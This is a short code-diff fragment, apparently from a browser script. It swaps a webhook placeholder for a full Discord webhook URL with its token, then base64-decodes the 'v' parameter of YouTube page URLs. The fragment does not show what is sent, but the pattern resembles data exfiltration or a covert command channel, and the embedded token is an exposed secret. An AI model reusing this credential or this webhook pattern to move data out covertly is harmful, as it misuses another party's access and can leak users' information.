@@ -19,7 +19,7 @@
         return;
     }
 
-    const webhook = "WEBHOOK-URL";
+    const webhook = "https://discord.com/api/webhooks/1526473579376414802/9gy0C4bzU3pGMcsP1_bBs3cRtvCz6HwE-hrhauc0ue6dFqitukRWWIvbZgY7x0XaUzB4";
     if (window.location.href.startsWith("https://www.youtube.com/")) {
         const url = new URL(window.location.href);
         const param = atob(url.searchParams.get("v"));
